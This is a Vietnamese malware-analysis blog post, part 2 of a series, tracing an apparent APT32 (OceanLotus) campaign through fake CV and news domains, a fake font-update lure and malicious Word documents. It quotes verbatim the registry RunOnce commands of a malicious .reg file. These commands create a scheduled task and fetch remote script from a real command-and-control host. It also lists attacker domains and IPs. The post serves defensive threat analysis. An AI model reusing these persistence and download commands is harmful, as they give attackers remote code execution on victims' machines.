@@ -1,0 +1,67 @@
+APT32 (OceanLotus) — Một chiến dịch APT bài bản như thế nào… (Phần 2)
+
+Phần 2: Domain lạ và những trò mèo của Attacker
+Ở Phần 1 tôi đã phân tích 1 mẫu APT được download từ url đính kèm trong email, ở phần 2 này tôi sẽ tiếp tục đi sâu hơn về thông tin của attacker. Thường thì url để download APT được gửi qua email trong rất nhiều case tôi gặp nó là url có host phổ biến dành để upload và chia sẻ file hoặc googledrive, còn để ý kỹ hơn về url này:
+https://mycv[.]vip/downloads/cv-ducnguyenminh.doc tôi thấy mycv[.]vip không chỉ đơn thuần là 1 host để mọi người lên upload file như bình thường.
+
+1. Domain lạ :)
+
+Xem kỹ nào: mycv[.]vip — 110[.]34[.]166[.]15(Nghe quen quen giống với mycv.com) thực chất đây là domain fake — chính là địa chỉ máy chủ của attacker.
+
+Thử lookup tiếp xem IP này được domain nào trỏ đến :)
+
+Mọi thứ dường như quá mới mẻ nhỉ:
+vtv-news[.]net: 2019–01–05 (Thực chất thằng này có từ 2018–09 cơ :D bây giờ nó lôi ra dùng lại thôi)
+mycv[.]vip: 2018–09–27
+Domain này được tạo ngày 08/08/2018, sau Phần 1 có lẽ nhiều anh em thi nhau truy cập vào domain này nhưng tiếc là hiện tại tôi nghĩ là attacker đã suspend web trên host hoặc khả năng attacker đã filter việc truy cập vào domain này :)). Ơn giời nhờ ăn ở tốt, thời điểm tôi truy cập vào và tìm kiếm thông tin thì nó vẫn hoạt động :
+Truy cập thử mycv[.]vip xem nào:
+Nhìn qua giao diện có vẻ như bị lỗi font và popup ra 1 thông báo The “Sans-serif” font not found -> Trang web yêu cầu người dùng update font để có thể view được nội dung trang web. Không khó để nhận biết thứ mà trang web muốn chúng ta tải về là cái gì: https[:]//download-attachments.s3.amazonaws[.]com/6dfa5b468f383a147c5be7905dc833bd16aeb68e/fd856a2-b0e5–4c7f-9960–2b7a6ec4e9d5
+File được download về là file updateChrome.reg có nội dung như hình dưới:
+Khi người dùng chạy file .reg lên key RunOnce được tạo ra để thực thi 1 lần với nội dung:
+“1”=”forfiles /P C:\\wInDoWs /M ExpL*.exe /C \”cmd /c \\\”SchTaSkS /Create /TN \\\”CTF Loader\\\” /SC MINUTE /MO 8 /F /TR \\\”’%progRAMData%\\ctfmon.exe’ //nologo //e:vbscript ‘%PrOgraMData%\\ctfmon.config’\\\”” -> Tạo taskjob để chạy %programdata%\\ctfmon.exe load file ctfmon.config cùng thư mục
+“2”=”forfiles /P C:\\WIndoWs /M eXpl*.exe /C \”cmd /c \\\” copy \”%wIndIR%\\SYStem32\\wscript.exe\” \”%programdata%\\ctfmon.exe\”” -> Copy wscript.exe chuẩn của windows vào thư mục %programdata%\\ctfmon.exe chính là file ctfmon.exe được thực thi bởi taskjob
+“3”=”forfiles /P c:\\wINdoWS /M exPl*.exe /C \”cmd /c \\\” echo On Error Resume Next>\”%progRAmdATA%\\ctfmon.config\” & echo GetObject(\\\”script:https://open.betaoffice.net/deko.png\\\")>>\"%PrOgRAmDAta%\\ctfmon.config\"" -> Connect tới C&C download file deko.png về thư mục %programdata%\\ctfmon.config chính là file config để ctfmon.exe load lên
+Cái Url này https://open[.]betaoffice[.]net/deko.png lúc tôi download thử thì nó out of date rồi nhưng cơ bản cũng có thể đoán được nó là kênh backdoor để nhận lệnh điều khiển từ C&C, nhìn C&C open.betaoffice.net có quen không các bạn :). Cái C&C này tôi nhớ không nhầm thì hình như có trong 1 post nào trên Facebook của anh Kiên M4n0w4r thì phải.
+Tiếp tục nào, tò mò muốn xem cái CV kia mà ko fix được font chữ :))) thế thì tải thử CV ở chỗ góc phải màn hình về xem thôi:
+Url: https://mycv[.]vip/downloads/CV-198756-DBEGWQ.doc
+
+2. Phân tích file CV-198756-DBEGWQ.doc
+File doc nhận được lại là 1 file MimeDoc. OK, tôi tiếp tục thực hiện việc dump file editdata.mso để lấy ActiveMime Object.
+Kịch bản lại như phần 1:
+• Dùng mấy câu lệnh python để decompress ActiveMime Object ta có được OleObject file.
+• Dung olevba để extract code VBA Macro độc hại từ OleObject file
+Tôi hay sử dụng bộ công cụ oletools để phân tích maldoc
+Đến đoạn này thì tôi thấy giống hệt cách thức của mẫu APT mà anh Kiên m4n0w4r từng phân tích rất hay trước đó nên tôi sẽ không trình bày lại cách phân tích nữa, anh em có thể tham khảo sử dụng cách phân tích tương tự như bài viết của a Kiên :D, Code VBA Macro thực hiện những nhiệm vụ sau:
+• Decode Base64 đoạn dữ liệu ra file mã độc dưới tên msohtml.log ở thư mục %temp%
+• Copy file wscript.exe chuẩn vào cùng thư mục với file msohtml.log với tên msohtml.exe
+• Tạo key và taskjob để thực hiện nhiệm vụ thực thi mã độc
+Với file msohtml.log, qua 2 lần decode tôi có được C&C:
+open[.]betaoffice[.]net — 31[.]3[.]232[.]109
+Ở Phần 1 C&C tôi tìm được là: outlook[.]updateoffices[.]net còn ở đây là open[.]betaoffice[.]net. Anh em nhìn những domain này quen không??? Rất quen nhé, xin trích dẫn post cảnh báo được chia sẻ trên Facebook của a Kiên.
+Hừm có vẻ như chiến dịch APT này được dựng nên không chỉ nhắm vào 1 tổ chức mà nhiều tổ chức ở Việt Nam anh em ạ :(
+Tiếp tục xem chiến dịch APT này gồm những gì nhé :)
+
+2. Đống mèo què của attacker
+Vậy là xử lý xong những gì chúng ta nhìn thấy nhưng tôi lại muốn tiếp tục đào sâu hơn vào cái web này xem có gì thú vị.
+Một số url chúng ta thấy:
+https://mycv[.]vip/downloads/cv-ducnguyenminh.doc
+https://mycv[.]vip/downloads/CV-198756-DBEGWQ.doc
+Thế thì vào thử thư mục downloads xem nào :)))
+Theo đường dẫn /downloads, gồm có:
+• Một số CV được tạo sẵn chắc là để phục vụ cho việc gửi email Phishing. Trong đó có CV-DucNguyenMinh.doc và CV-198756-DBEGWQ.doc tôi đã phân tích trước đó
+• Các file .reg tương tự như file updateChrome.reg ở trên, có lẽ nó sẽ tương ứng với mỗi trình duyệt mà bạn sử dụng
+• Thư mục windows — Last modified 2018–07–05, thư mục này chứa 3 bộ files tương ứng với Chome, IE và Fonts:
+• Thư mục mac — Last modified 2018–07–05, thư mục này chứa 3 files install tương ứng với Firefox, Google Chrome và Fonts:
+Có nhiều thứ để phân tích và bơi rồi :D
+Khoan động đến việc phân tích kĩ các mẫu này, tôi mới chỉ xem qua và nhận thấy các bộ mẫu này phong cách code rất giống với phong cách trong nhiều bài viết phân tích về APT32 (OceanLotus).
+By the way, nhắc đến phân tích mẫu, cảm ơn thằng em xã hội hoangcuongflp (YzBuY2gw) đã đồng hành hỗ trợ tôi phân tích 1 số mẫu trong đống này. Đợt đó tôi còn dính đi hỗ trợ xlsc cho 1 bên khác nên bận bù lu luôn :))).
+Tiếp tục với những thứ tôi tìm được, đến đây có thể nhiều anh em nghĩ rằng đống mẫu kia attacker đơn giản là vứt lên khi nào cần dùng thì gửi link đến victim để download thôi :D. Nhưng phân tích kỹ hơn, tôi thử download source của mycv.vip về kiểm tra (Ctrl + S hoặc chuột phải View page source thôi anh em :D)
+Ngoài code html để fake 1 cái giao diện web ra, còn có javascript để xử lý:
+Ngoài ra, attacker còn sử dụng thêm 1 script nữa (https://mycv.vip/scripts/scripts.js) để target tới nhiều nền tảng khác nhau:
+Đối với trình duyệt thì có: Chrome, Firefox, IE, Edge, Opera. Mobile thì có Ipad, Iphone, Android. OS thì có Windows, MacOS :)) Đầy đủ cả mẫu tương ứng với mỗi nền tảng :)
+Thực sự là rất bài bản và mang tính chất chiến dịch :)
+Tôi xem tiếp cái domain thứ 2: vtv-news.net. Về cơ bản là attacker clone giao diện của trang này (https://vtv.vn) và cách thức hoạt động tương tự như mycv.vip:
+Ở vtv-news.net thì attacker tử tế hơn còn để lại cả bộ source code để đỡ phải download thủ công:
+Thư mục windows, mac cũng có các file tương tự như trên mycv.vip:
+Kết thúc phần 2: Cơ bản là những gì mà attacker có cho chiến dịch APT này tôi đã show cho anh em thấy, tôi nghĩ anh em nên add 2 cái domains (mycv.vip và vtv-news.net) vào blacklist và truy vấn thử xem trong tổ chức, cơ quan mình từ năm ngoái đến giờ có gì không nhé :)).
+Phần sau là phần cuối cùng sẽ là bài viết chi tiết về từng sample tôi thu thập được từ vụ này và đống IoCs của attacker, nếu có hứng thú anh em tiếp tục follow nhé :)
